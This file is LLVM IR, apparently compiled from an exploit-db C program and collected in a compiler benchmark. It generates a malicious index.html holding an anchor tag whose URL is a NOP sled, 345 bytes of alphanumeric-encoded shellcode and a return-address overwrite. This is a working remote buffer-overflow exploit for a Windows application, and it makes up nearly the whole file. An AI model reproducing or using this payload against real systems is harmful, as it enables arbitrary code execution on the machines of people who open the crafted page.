; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_6121.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_6121.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shellcode = private unnamed_addr constant [345 x i8] c"\DA\C3\D9t$\F4ZJJJJJJJJJJCCCCCCC7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIKLM8G4EPC0C0LKQUGLLKCLDEBXEQJOLKPOEHLKQOQ0EQJKPILKGDLKEQJNFQIPMINLK4IPCDC7IQIZDMEQIRJKL4GKQDGTETCEM5LKQOGTEQJKCVLKDLPKLKQOELEQJKLKELLKC1JKLIQLQ4C4HCQOP1L6E0QFBDLKQVFPLKG0DLLKBPELNMLKE8C8K9L8LCIPCZPPCXJPMZETQOBHLXKNMZDNF7KOJGBCFZQLBWBIBNBDBOBWCCQLCCD9CCCDCUBMGCP2QLCSE1BLBCFNE5D8BEC0EZAA\00", align 16
@__const.main.eip = private unnamed_addr constant [4 x i8] c"#D\06}", align 1
@__const.main.html = private unnamed_addr constant [16 x i8] c"<a href='http://", align 16
@__const.main.chtml = private unnamed_addr constant [11 x i8] c"'>yahhh</a>", align 1
@.str = private unnamed_addr constant [11 x i8] c"index.html\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"Failed opening index.html\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [22 x i8] c"[+] Building payload\0A\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"[+] Success writing to index.html\0A\00", align 1
@.str.6 = private unnamed_addr constant [34 x i8] c"[-] Failed writing to index.html\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32*, align 8
  %3 = alloca [491 x i8], align 16
  %4 = alloca [345 x i8], align 16
  %5 = alloca [4 x i8], align 1
  %6 = alloca [16 x i8], align 16
  %7 = alloca [11 x i8], align 1
  store i32 0, i32* %1, align 4
  %8 = bitcast [345 x i8]* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %8, i8* align 16 getelementptr inbounds ([345 x i8], [345 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 345, i1 false)
  %9 = bitcast [4 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %9, i8* align 1 getelementptr inbounds ([4 x i8], [4 x i8]* @__const.main.eip, i32 0, i32 0), i64 4, i1 false)
  %10 = bitcast [16 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([16 x i8], [16 x i8]* @__const.main.html, i32 0, i32 0), i64 16, i1 false)
  %11 = bitcast [11 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %11, i8* align 1 getelementptr inbounds ([11 x i8], [11 x i8]* @__const.main.chtml, i32 0, i32 0), i64 11, i1 false)
  %12 = call i32* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %12, i32** %2, align 8
  %13 = load i32*, i32** %2, align 8
  %14 = icmp eq i32* %13, null
  br i1 %14, label %15, label %18

15:                                               ; preds = %0
  %16 = call i32 @perror(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0))
  %17 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %17, i32* %1, align 4
  br label %57

18:                                               ; preds = %0
  %19 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %20 = getelementptr inbounds [491 x i8], [491 x i8]* %3, i64 0, i64 0
  %21 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i64 0, i64 0
  %22 = call i32 (i8*, ...) @memcpy(i8* %20, i8* %21, i64 16)
  %23 = getelementptr inbounds [491 x i8], [491 x i8]* %3, i64 0, i64 0
  %24 = getelementptr inbounds i8, i8* %23, i64 16
  %25 = call i32 @memset(i8* %24, i32 144, i32 116)
  %26 = getelementptr inbounds [491 x i8], [491 x i8]* %3, i64 0, i64 0
  %27 = getelementptr inbounds i8, i8* %26, i64 16
  %28 = getelementptr inbounds i8, i8* %27, i64 116
  %29 = getelementptr inbounds [345 x i8], [345 x i8]* %4, i64 0, i64 0
  %30 = call i32 (i8*, ...) @memcpy(i8* %28, i8* %29, i64 345)
  %31 = getelementptr inbounds [491 x i8], [491 x i8]* %3, i64 0, i64 0
  %32 = getelementptr inbounds i8, i8* %31, i64 16
  %33 = getelementptr inbounds i8, i8* %32, i64 116
  %34 = getelementptr inbounds i8, i8* %33, i64 345
  %35 = getelementptr inbounds i8, i8* %34, i64 -1
  %36 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 0
  %37 = call i32 (i8*, ...) @memcpy(i8* %35, i8* %36, i64 4)
  %38 = getelementptr inbounds [491 x i8], [491 x i8]* %3, i64 0, i64 0
  %39 = getelementptr inbounds i8, i8* %38, i64 16
  %40 = getelementptr inbounds i8, i8* %39, i64 116
  %41 = getelementptr inbounds i8, i8* %40, i64 345
  %42 = getelementptr inbounds i8, i8* %41, i64 -1
  %43 = getelementptr inbounds i8, i8* %42, i64 4
  %44 = getelementptr inbounds [11 x i8], [11 x i8]* %7, i64 0, i64 0
  %45 = call i32 (i8*, ...) @memcpy(i8* %43, i8* %44, i64 11)
  %46 = load i32*, i32** %2, align 8
  %47 = getelementptr inbounds [491 x i8], [491 x i8]* %3, i64 0, i64 0
  %48 = call i32 @fprintf(i32* %46, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %47)
  %49 = load i32*, i32** %2, align 8
  %50 = call i64 @fclose(i32* %49)
  %51 = icmp eq i64 %50, 0
  br i1 %51, label %52, label %54

52:                                               ; preds = %18
  %53 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  br label %56

54:                                               ; preds = %18
  %55 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.6, i64 0, i64 0))
  br label %56

56:                                               ; preds = %54, %52
  store i32 0, i32* %1, align 4
  br label %57

57:                                               ; preds = %56, %15
  %58 = load i32, i32* %1, align 4
  ret i32 %58
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @memcpy(i8*, ...) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @fprintf(i32*, i8*, i8*) #2

declare dso_local i64 @fclose(i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
